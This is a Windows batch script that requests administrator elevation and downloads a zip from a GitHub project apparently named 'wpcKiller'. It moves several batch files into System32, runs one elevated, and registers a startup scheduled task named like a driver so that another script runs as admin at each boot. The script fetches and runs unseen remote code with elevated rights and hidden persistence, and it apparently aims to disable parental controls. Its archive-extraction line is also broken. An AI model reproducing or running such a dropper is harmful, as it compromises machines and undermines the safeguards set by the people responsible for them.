echo Requesting Administrator privledges, please wait for UAC.
powershell /c start-process -verb runAs \"%~s0\"
cd %temp%
Md Dos
cd dos
powershell -Command "Invoke-WebRequest https://github.com/cbaie9/wpcKiller/archive/refs/heads/main.zip -Outfile  files.zip"
powershell -command "Expand-Archive -LiteralPath %temp%\dos"
cd wpcKiller-main\wpcKiller-main
move msdos.bat %windir%\System32
move win.bat %windir%\system32
move reboot.bat %windir%\system32
move patch.bat %windir%\system32
move dosexec.bat %homepath%
Cd %windir%\system32
start msdos.bat -verb runAs \"%~s0\"
SCHTASKS /CREATE /SC onstart /TN "drivers\DosWpcKill" /TR "C:\Windows\System32\dosexec.bat" /RU admin
exit /b

